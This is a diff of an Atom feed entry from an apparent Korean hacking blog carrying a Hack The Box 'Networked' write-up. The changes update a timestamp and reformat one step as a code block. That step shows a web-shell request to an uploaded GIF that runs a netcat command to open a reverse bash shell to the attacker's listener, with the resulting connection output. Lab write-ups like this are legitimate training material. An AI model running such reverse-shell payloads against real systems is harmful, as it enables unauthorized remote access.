@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="systemahacker.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="systemahacker.github.io/" rel="alternate" type="text/html" /><updated>2019-11-21T00:19:47+09:00</updated><id>systemahacker.github.io/feed.xml</id><title type="html">SystemaHacker</title><subtitle>Little blog for post some write-ups</subtitle><entry><title type="html">Hack The Box: Networked</title><link href="systemahacker.github.io/writeup/networked" rel="alternate" type="text/html" title="Hack The Box: Networked" /><published>2019-09-24T18:23:03+09:00</published><updated>2019-09-24T18:23:03+09:00</updated><id>systemahacker.github.io/writeup/networked</id><content type="html" xml:base="systemahacker.github.io/writeup/networked">&lt;div style=&quot;width: 220px; margin: 0 auto;&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="systemahacker.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="systemahacker.github.io/" rel="alternate" type="text/html" /><updated>2019-11-21T00:37:34+09:00</updated><id>systemahacker.github.io/feed.xml</id><title type="html">SystemaHacker</title><subtitle>Little blog for post some write-ups</subtitle><entry><title type="html">Hack The Box: Networked</title><link href="systemahacker.github.io/writeup/networked" rel="alternate" type="text/html" title="Hack The Box: Networked" /><published>2019-09-24T18:23:03+09:00</published><updated>2019-09-24T18:23:03+09:00</updated><id>systemahacker.github.io/writeup/networked</id><content type="html" xml:base="systemahacker.github.io/writeup/networked">&lt;div style=&quot;width: 220px; margin: 0 auto;&quot;&gt;
     &lt;script src=&quot;https://www.hackthebox.eu/badge/92383&quot;&gt;&lt;/script&gt;
     &lt;noscript&gt;
         &lt;img src=&quot;https://www.hackthebox.eu/badge/image/92383&quot; style=&quot;margin: 0 auto;&quot; alt=&quot;Hack The Box&quot; /&gt;
@@ -82,8 +82,11 @@ Nmap done: 1 IP address (1 host up) scanned in 63.85 seconds
 &lt;p&gt;웹 쉘을 탈취하기 위해 필자(공격자) PC에서 netcat 리스닝 2021 포트를 열었다.&lt;/p&gt;
 
 &lt;p&gt;이제 올려놓은 악성코드를 이용하여 리버스 쉘을 연결하면.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash&lt;/code&gt;
-&lt;br /&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
 &lt;code&gt;Connection from 10.10.10.146:41584&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;떳다.&lt;/p&gt;
 
